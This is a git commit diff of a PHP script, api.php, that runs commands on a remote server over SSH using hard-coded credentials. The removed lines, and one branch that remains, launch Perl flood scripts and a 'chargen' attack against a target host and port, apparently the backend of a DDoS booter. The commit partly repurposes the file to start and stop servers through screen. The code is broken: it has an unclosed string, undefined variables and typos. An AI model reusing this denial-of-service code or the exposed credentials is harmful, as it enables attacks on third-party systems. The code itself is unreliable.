bb75261feb862f2fafaf76307773e9b987975bb2
Telzi <46298730+Telzi@users.noreply.github.com>
2022-01-13 00:18:04 +0700

    Update api.php

--- api.php
+++ api.php
@@ -1,8 +1,9 @@
+
 <?php
 //API BY KRITTKORN
 define("SSH_IP", "45.130.141.159");
 define("SSH_PORT", "22");
-define("SSH_USER", "root");
+define("SSH_USER", "xver");
 define("SSH_PASSWORD", "1212121Zz");
 
 set_time_limit(0);
@@ -13,6 +14,7 @@ if(empty($_GET['name']) || empty($_GET['port']) || empty($_GET['cmd']))
 $name = escapeshellcmd($_GET['name']);
 $port = escapeshellcmd($_GET['port']);
 $cmd = escapeshellcmd($_GET['cmd']);
+$commandstart = "./start.sh";
 
 if(!function_exists("ssh2_connect")) die("Please install the SSH2 Dependency on the Linux Server First.");
 
@@ -22,25 +24,25 @@ else
 	if(!ssh2_auth_password($con, SSH_USER, SSH_PASSWORD)) die("Invalid Credentials...\n");
     else
     {
-    	if($method == "start" || $method == "start")
+    	if($cmd == "start" || $cmd == "start")
     	{
-	        if(!($stream = ssh2_exec($con, "root perl gTjDKK0.pl ".$host." ".$port." 65500 ".$time))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "screen -dmS $name $commandstart))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
-	            echo "ATTACK : $host PORT : $port TIME : $time METHOD : $method";
+	            echo "Server Opening $name";
 	        }
 	    }
-	    elseif($method == "stop" || $method == "stop")
+	    elseif($cmd == "stop" || $cmd == "stop")
     	{
-	        if(!($stream = ssh2_exec($con, "screen -dmS root perl layer7.pl ".$host." 500 500 127.0.0.1"))) die("Command couldn't be executed, something went wrong...\n");
+	        if(!($stream = ssh2_exec($con, "screen -S $name -p 0 -X stuff stop"))) die("Command couldn't be executed, something went wrong...\n");
 	        else
 	        {
 	            echo "" . stream_get_contents($stream);
-	            echo "ATTACK : $host PORT : $port TIME : $time METHOD : $method";
+	            echo "Stop Server : Success";
 	        }
 	    }
-	    elseif($method == "cmd" || $method == "cmd")
+	    elseif($cmd == "cmd" || $cmd == "cmd")
     	{
 	        if(!($stream = ssh2_exec($con, "/root/chargen ".$host." ".$port." ".$list." ".ATTACK_THREADS." ".$time))) die("Command couldn't be executed, something went wrong...\n");
 	        else
@@ -49,7 +51,7 @@ else
 	            echo "ATTACK : $hot PORT : $port TIME : $time METHOD : $method";
 	        }
 	    }
-	    elseif($method == "kuy" || $method == "kuy")
+	    elseif($cmd == "kuy" || $method == "kuy")
     	{
 	        if(!($stream = ssh2_exec($con, "screen -s root -X quit"))) die("Command couldn't be executed, something went wrong...\n");
 	        else
